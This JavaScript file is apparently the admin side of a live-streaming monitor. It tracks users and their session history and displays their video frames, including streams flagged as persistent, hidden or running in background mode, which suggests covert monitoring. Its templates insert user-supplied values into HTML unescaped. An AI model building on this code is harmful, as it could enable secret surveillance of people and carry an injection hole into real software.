class AdvancedAdminDashboard {
    constructor() {
        this.socket = null;
        this.users = new Map(); // Persistent user tracking
        this.streams = new Map();
        this.selectedStream = null;
        this.isConnected = false;
        this.watchingStreams = new Set();
        this.frameCache = new Map(); // Cache frames for smooth playback
        this.lastFrameUpdate = new Map();
        
        this.initializeAdvancedAdmin();
    }

    async initializeAdvancedAdmin() {
        console.log('🛡️ Initializing Advanced Admin Dashboard...');
        this.setupWebSocket();
        this.loadUserHistory();
        this.setupPerformanceOptimizations();
        console.log('✅ Advanced Admin Dashboard ready!');
    }

    setupWebSocket() {
        try {
            if (typeof io !== 'undefined') {
                this.socket = io();
                
                this.socket.on('connect', () => {
                    console.log('🔗 Advanced Admin connected to server');
                    this.isConnected = true;
                    this.updateConnectionStatus('Connected');
                    
                    // Register as advanced admin
                    this.socket.emit('admin-register', { 
                        type: 'advanced',
                        capabilities: ['user-tracking', 'persistent-monitoring', 'smooth-streaming']
                    });
                });

                this.socket.on('disconnect', () => {
                    console.log('❌ Admin disconnected');
                    this.isConnected = false;
                    this.updateConnectionStatus('Disconnected');
                });

                // Enhanced user events
                this.socket.on('user-registered', (data) => {
                    console.log('👤 User registered:', data);
                    this.addOrUpdateUser(data);
                });

                this.socket.on('advanced-stream-started', (data) => {
                    console.log('📺 Advanced stream started:', data);
                    this.handleAdvancedStreamStart(data);
                });

                this.socket.on('advanced-stream-stopped', (data) => {
                    console.log('⏹️ Advanced stream stopped:', data);
                    this.handleAdvancedStreamStop(data);
                });

                this.socket.on('stream-background-mode', (data) => {
                    console.log('📱 Stream background mode:', data);
                    this.updateStreamBackgroundStatus(data);
                });

                this.socket.on('stream-keep-alive', (data) => {
                    console.log('💓 Stream keep-alive:', data);
                    this.updateUserLastSeen(data.userId);
                });

                // Optimized video events
                this.socket.on('optimized-video-chunk', (data) => {
                    this.handleOptimizedVideoFrame(data);
                });

                this.socket.on('user-history', (data) => {
                    console.log('📊 Received user history:', data);
                    this.loadUserHistoryData(data);
                });

            } else {
                console.log('❌ Socket.IO not available');
                this.updateConnectionStatus('Socket.IO Missing');
            }
        } catch (error) {
            console.error('❌ WebSocket setup failed:', error);
            this.updateConnectionStatus('Connection Failed');
        }
    }

    setupPerformanceOptimizations() {
        // Use requestAnimationFrame for smooth UI updates
        this.animationFrame = null;
        this.pendingUpdates = new Set();
        
        // Batch UI updates for better performance
        this.scheduleUpdate = (updateType) => {
            this.pendingUpdates.add(updateType);
            
            if (!this.animationFrame) {
                this.animationFrame = requestAnimationFrame(() => {
                    this.processPendingUpdates();
                    this.animationFrame = null;
                });
            }
        };
    }

    processPendingUpdates() {
        if (this.pendingUpdates.has('streams')) {
            this.renderStreams();
        }
        if (this.pendingUpdates.has('stats')) {
            this.updateStats();
        }
        if (this.pendingUpdates.has('users')) {
            this.renderUserHistory();
        }
        
        this.pendingUpdates.clear();
    }

    addOrUpdateUser(userData) {
        const existingUser = this.users.get(userData.userId) || {};
        
        const user = {
            ...existingUser,
            userId: userData.userId,
            lastSeen: new Date(userData.timestamp),
            userAgent: userData.userAgent,
            screenResolution: userData.screenResolution,
            totalSessions: (existingUser.totalSessions || 0) + 1,
            status: 'online',
            isStreaming: false
        };
        
        this.users.set(userData.userId, user);
        this.saveUserHistory();
        this.scheduleUpdate('users');
    }

    handleAdvancedStreamStart(data) {
        // Update user status
        const user = this.users.get(data.userId);
        if (user) {
            user.isStreaming = true;
            user.currentStreamId = data.streamId;
            user.streamStartTime = new Date(data.timestamp);
        }
        
        // Add stream
        this.streams.set(data.userId, {
            userId: data.userId,
            username: user?.username || `User_${data.userId.slice(-4)}`,
            status: 'live',
            streamId: data.streamId,
            quality: data.quality,
            aiEnabled: false,
            startTime: new Date(data.timestamp),
            persistent: data.persistent,
            backgroundMode: false
        });
        
        this.scheduleUpdate('streams');
        this.scheduleUpdate('stats');
        this.showNotification(`${user?.username || 'User'} started advanced streaming`, 'success');
    }

    handleAdvancedStreamStop(data) {
        // Update user status
        const user = this.users.get(data.userId);
        if (user) {
            user.isStreaming = false;
            user.lastStreamEnd = new Date(data.timestamp);
            delete user.currentStreamId;
        }
        
        // Remove stream
        this.streams.delete(data.userId);
        this.watchingStreams.delete(data.userId);
        
        this.scheduleUpdate('streams');
        this.scheduleUpdate('stats');
        this.saveUserHistory();
    }

    updateStreamBackgroundStatus(data) {
        const stream = this.streams.get(data.userId);
        if (stream) {
            stream.backgroundMode = data.enabled;
            this.scheduleUpdate('streams');
        }
    }

    updateUserLastSeen(userId) {
        const user = this.users.get(userId);
        if (user) {
            user.lastSeen = new Date();
            this.saveUserHistory();
        }
    }

    handleOptimizedVideoFrame(data) {
        // Throttle frame updates for smooth playback
        const now = Date.now();
        const lastUpdate = this.lastFrameUpdate.get(data.userId) || 0;
        
        // Skip frame if too frequent (maintain 8 FPS max for smooth display)
        if (now - lastUpdate < 125) {
            return;
        }
        
        this.lastFrameUpdate.set(data.userId, now);
        
        // Cache frame for smooth playback
        this.frameCache.set(data.userId, {
            frameData: data.frameData,
            timestamp: data.timestamp,
            quality: data.quality,
            hidden: data.hidden
        });
        
        // Display frame smoothly
        this.displaySmoothVideoFrame(data.userId, data.frameData, data.hidden);
    }

    displaySmoothVideoFrame(userId, frameData, isHidden) {
        // Display in card preview with smooth transitions
        const preview = document.getElementById(`preview-${userId}`);
        if (preview && frameData) {
            let img = preview.querySelector('img');
            if (!img) {
                img = document.createElement('img');
                img.style.cssText = `
                    width: 100%;
                    height: 100%;
                    object-fit: cover;
                    border-radius: 10px;
                    transition: opacity 0.2s ease;
                    image-rendering: optimizeSpeed;
                `;
                preview.innerHTML = '';
                preview.appendChild(img);
                
                // Add status overlay
                const overlay = document.createElement('div');
                overlay.className = 'stream-overlay';
                overlay.style.cssText = `
                    position: absolute;
                    top: 10px;
                    left: 10px;
                    background: rgba(0,0,0,0.8);
                    padding: 5px 10px;
                    border-radius: 15px;
                    font-size: 0.8rem;
                    color: white;
                    transition: all 0.3s ease;
                `;
                preview.appendChild(overlay);
            }
            
            const overlay = preview.querySelector('.stream-overlay');
            if (overlay) {
                overlay.innerHTML = isHidden ? 
                    '<i class="fas fa-eye-slash" style="color: #F39C12; margin-right: 5px;"></i>BACKGROUND' :
                    '<i class="fas fa-circle" style="color: #27AE60; margin-right: 5px;"></i>LIVE';
            }
            
            // Smooth image update
            requestAnimationFrame(() => {
                img.style.opacity = '0.7';
                setTimeout(() => {
                    img.src = frameData;
                    img.style.opacity = '1';
                }, 50);
            });
        }

        // Display in modal if open
        const modalContainer = document.getElementById('modalVideoContainer');
        if (modalContainer && this.selectedStream && this.selectedStream.userId === userId) {
            let modalImg = modalContainer.querySelector('img');
            if (!modalImg) {
                modalImg = document.createElement('img');
                modalImg.style.cssText = `
                    width: 100%;
                    height: 100%;
                    object-fit: contain;
                    border-radius: 10px;
                    transition: opacity 0.2s ease;
                `;
                modalContainer.innerHTML = '';
                modalContainer.appendChild(modalImg);
            }
            
            requestAnimationFrame(() => {
                modalImg.src = frameData;
            });
        }
    }

    renderStreams() {
        const grid = document.getElementById('streamsGrid');
        
        if (this.streams.size === 0) {
            grid.innerHTML = `
                <div style="text-align: center; padding: 40px; color: #888;">
                    <i class="fas fa-users" style="font-size: 3rem; margin-bottom: 20px;"></i>
                    <h3>No Active Streams</h3>
                    <p>Users will appear here when they start streaming</p>
                    <button onclick="window.advancedAdmin.showUserHistory()" style="margin-top: 15px; padding: 10px 20px; background: #3498DB; color: white; border: none; border-radius: 8px; cursor: pointer;">
                        📊 View User History
                    </button>
                </div>
            `;
            return;
        }

        grid.innerHTML = '';
        
        this.streams.forEach((stream) => {
            const card = this.createAdvancedStreamCard(stream);
            grid.appendChild(card);
        });
    }

    createAdvancedStreamCard(stream) {
        const card = document.createElement('div');
        card.className = 'stream-card advanced-card';
        card.setAttribute('data-user-id', stream.userId);

        const user = this.users.get(stream.userId);
        const statusClass = stream.status === 'live' ? 'status-live' : 'status-offline';
        const isWatching = this.watchingStreams.has(stream.userId);
        const backgroundMode = stream.backgroundMode ? '📱' : '';

        card.innerHTML = `
            <div class="stream-header">
                <div class="stream-user">
                    <i class="fas fa-user"></i>
                    ${stream.username} ${backgroundMode}
                    ${stream.persistent ? '<span style="color: #FFD700; font-size: 0.8rem;">⭐ PERSISTENT</span>' : ''}
                </div>
                <div class="stream-status ${statusClass}">
                    ${stream.status.toUpperCase()}
                </div>
            </div>
            
            <div class="stream-preview" id="preview-${stream.userId}" style="background: #000; height: 200px; border-radius: 10px; display: flex; align-items: center; justify-content: center; color: white; position: relative; overflow: hidden;">
                <div style="text-align: center;">
                    <i class="fas fa-video" style="font-size: 3rem; color: #27AE60; margin-bottom: 10px;"></i>
                    <div>ADVANCED STREAM</div>
                    <div style="font-size: 0.8rem; opacity: 0.7;">${stream.quality}</div>
                </div>
            </div>
            
            <div class="stream-info" style="padding: 15px 0;">
                <div style="font-size: 0.9rem; margin-bottom: 5px;">
                    <i class="fas fa-clock"></i> Started: ${stream.startTime.toLocaleTimeString()}
                </div>
                <div style="font-size: 0.9rem; margin-bottom: 5px;">
                    <i class="fas fa-history"></i> Sessions: ${user?.totalSessions || 1}
                </div>
                <div style="font-size: 0.9rem;">
                    <i class="fas fa-desktop"></i> ${user?.screenResolution || 'Unknown'}
                </div>
            </div>
            
            <div class="stream-actions">
                <button class="action-btn primary" onclick="window.advancedAdmin.watchAdvancedStream('${stream.userId}')">
                    <i class="fas fa-eye"></i>
                    ${isWatching ? 'Watching' : 'Watch Stream'}
                </button>
                <button class="action-btn info" onclick="window.advancedAdmin.showUserDetails('${stream.userId}')">
                    <i class="fas fa-info-circle"></i>
                    Details
                </button>
                <button class="action-btn danger" onclick="kickUser('${stream.userId}')">
                    <i class="fas fa-ban"></i>
                    Kick
                </button>
            </div>
        `;

        // Add click handler for modal
        card.addEventListener('click', (e) => {
            if (!e.target.closest('.stream-actions')) {
                this.openStreamDetail(stream);
            }
        });

        return card;
    }

    watchAdvancedStream(userId) {
        if (this.socket && this.isConnected) {
            console.log(`👁️ Starting to watch advanced stream: ${userId}`);
            
            this.watchingStreams.add(userId);
            this.socket.emit('admin-watch-advanced-stream', { userId });
            
            this.scheduleUpdate('streams');
            this.showNotification('Starting advanced stream monitoring...', 'info');
        } else {
            this.showNotification('Not connected to server', 'error');
        }
    }

    showUserDetails(userId) {
        const user = this.users.get(userId);
        if (!user) return;

        const modal = document.createElement('div');
        modal.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 10000;
            display: flex;
            align-items: center;
            justify-content: center;
        `;

        modal.innerHTML = `
            <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 30px; border-radius: 20px; max-width: 500px; color: white; box-shadow: 0 20px 40px rgba(0,0,0,0.3);">
                <h3 style="margin-bottom: 20px; text-align: center;">👤 User Details</h3>
                <div style="background: rgba(255,255,255,0.1); padding: 20px; border-radius: 10px; margin-bottom: 20px;">
                    <p><strong>User ID:</strong> ${user.userId}</p>
                    <p><strong>Status:</strong> ${user.isStreaming ? '🔴 Streaming' : '⚫ Offline'}</p>
                    <p><strong>Total Sessions:</strong> ${user.totalSessions}</p>
                    <p><strong>Screen Resolution:</strong> ${user.screenResolution}</p>
                    <p><strong>Last Seen:</strong> ${user.lastSeen.toLocaleString()}</p>
                    ${user.streamStartTime ? `<p><strong>Stream Started:</strong> ${user.streamStartTime.toLocaleString()}</p>` : ''}
                    <p><strong>Browser:</strong> ${user.userAgent ? user.userAgent.split(' ').slice(-2).join(' ') : 'Unknown'}</p>
                </div>
                <div style="text-align: center;">
                    <button onclick="this.parentElement.parentElement.remove()" style="background: #FFD700; color: #333; border: none; padding: 12px 24px; border-radius: 8px; cursor: pointer; font-weight: bold;">
                        Close
                    </button>
                </div>
            </div>
        `;

        document.body.appendChild(modal);
        
        // Close on click outside
        modal.addEventListener('click', (e) => {
            if (e.target === modal) {
                modal.remove();
            }
        });
    }

    showUserHistory() {
        const modal = document.createElement('div');
        modal.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 10000;
            display: flex;
            align-items: center;
            justify-content: center;
        `;

        const userList = Array.from(this.users.values())
            .sort((a, b) => b.lastSeen - a.lastSeen)
            .slice(0, 10)
            .map(user => `
                <div style="background: rgba(255,255,255,0.1); padding: 15px; border-radius: 8px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center;">
                    <div>
                        <strong>${user.userId.slice(-8)}</strong>
                        <div style="font-size: 0.9rem; opacity: 0.8;">
                            ${user.totalSessions} sessions • Last seen: ${user.lastSeen.toLocaleDateString()}
                        </div>
                    </div>
                    <div style="text-align: right;">
                        ${user.isStreaming ? '<span style="color: #27AE60;">🔴 LIVE</span>' : '<span style="color: #95a5a6;">⚫ Offline</span>'}
                    </div>
                </div>
            `).join('');

        modal.innerHTML = `
            <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 30px; border-radius: 20px; max-width: 600px; max-height: 80vh; overflow-y: auto; color: white; box-shadow: 0 20px 40px rgba(0,0,0,0.3);">
                <h3 style="margin-bottom: 20px; text-align: center;">📊 User History</h3>
                <div style="margin-bottom: 20px;">
                    <p style="text-align: center; opacity: 0.9;">Total Users: ${this.users.size} • Active: ${Array.from(this.users.values()).filter(u => u.isStreaming).length}</p>
                </div>
                <div style="max-height: 400px; overflow-y: auto;">
                    ${userList || '<p style="text-align: center; opacity: 0.7;">No users found</p>'}
                </div>
                <div style="text-align: center; margin-top: 20px;">
                    <button onclick="this.parentElement.parentElement.remove()" style="background: #FFD700; color: #333; border: none; padding: 12px 24px; border-radius: 8px; cursor: pointer; font-weight: bold;">
                        Close
                    </button>
                </div>
            </div>
        `;

        document.body.appendChild(modal);
        
        modal.addEventListener('click', (e) => {
            if (e.target === modal) {
                modal.remove();
            }
        });
    }

    loadUserHistory() {
        const saved = localStorage.getItem('encryptionai_user_history');
        if (saved) {
            try {
                const data = JSON.parse(saved);
                data.forEach(userData => {
                    this.users.set(userData.userId, {
                        ...userData,
                        lastSeen: new Date(userData.lastSeen),
                        streamStartTime: userData.streamStartTime ? new Date(userData.streamStartTime) : null,
                        status: 'offline',
                        isStreaming: false
                    });
                });
                console.log(`📊 Loaded ${this.users.size} users from history`);
            } catch (error) {
                console.error('Error loading user history:', error);
            }
        }
    }

    saveUserHistory() {
        try {
            const data = Array.from(this.users.values());
            localStorage.setItem('encryptionai_user_history', JSON.stringify(data));
        } catch (error) {
            console.error('Error saving user history:', error);
        }
    }

    updateConnectionStatus(status) {
        const connectionStatus = document.getElementById('connectionStatus');
        if (connectionStatus) {
            connectionStatus.textContent = status;
            connectionStatus.style.color = status === 'Connected' ? '#27AE60' : '#E74C3C';
        }
    }

    updateStats() {
        const totalUsers = this.users.size;
        const activeStreams = this.streams.size;
        const onlineUsers = Array.from(this.users.values()).filter(u => u.status === 'online').length;
        
        document.getElementById('totalUsers').textContent = totalUsers;
        document.getElementById('activeStreams').textContent = activeStreams;
        document.getElementById('aiProcessing').textContent = Array.from(this.streams.values()).filter(s => s.aiEnabled).length;
    }

    openStreamDetail(stream) {
        this.selectedStream = stream;
        const modal = document.getElementById('streamModal');
        const modalTitle = document.getElementById('modalTitle');

        modalTitle.textContent = `${stream.username} - Advanced Stream Details`;
        modal.classList.add('active');
        
        if (stream.status === 'live') {
            this.watchAdvancedStream(stream.userId);
        }
    }

    showNotification(message, type = 'info') {
        const notification = document.createElement('div');
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 25px;
            background: ${type === 'success' ? '#27AE60' : type === 'error' ? '#E74C3C' : '#3498DB'};
            color: white;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
            z-index: 10001;
            transform: translateX(400px);
            transition: transform 0.3s ease;
            font-weight: 500;
        `;
        notification.textContent = message;
        
        document.body.appendChild(notification);
        
        setTimeout(() => {
            notification.style.transform = 'translateX(0)';
        }, 100);
        
        setTimeout(() => {
            notification.style.transform = 'translateX(400px)';
            setTimeout(() => {
                if (document.body.contains(notification)) {
                    document.body.removeChild(notification);
                }
            }, 300);
        }, 4000);
    }
}

// Global functions
function kickUser(userId) {
    console.log(`👢 Kicking user: ${userId}`);
    if (window.advancedAdmin && window.advancedAdmin.socket) {
        window.advancedAdmin.socket.emit('admin-kick-user', {
            targetUserId: userId
        });
        window.advancedAdmin.showNotification('User kick command sent', 'warning');
    }
}

function refreshAllStreams() {
    console.log('🔄 Refreshing streams...');
    if (window.advancedAdmin) {
        window.advancedAdmin.scheduleUpdate('streams');
        window.advancedAdmin.showNotification('Streams refreshed', 'success');
    }
}

function closeModal() {
    document.getElementById('streamModal').classList.remove('active');
}

// Initialize advanced admin dashboard
document.addEventListener('DOMContentLoaded', () => {
    window.advancedAdmin = new AdvancedAdminDashboard();
    console.log('🎉 Advanced Admin Dashboard loaded!');
});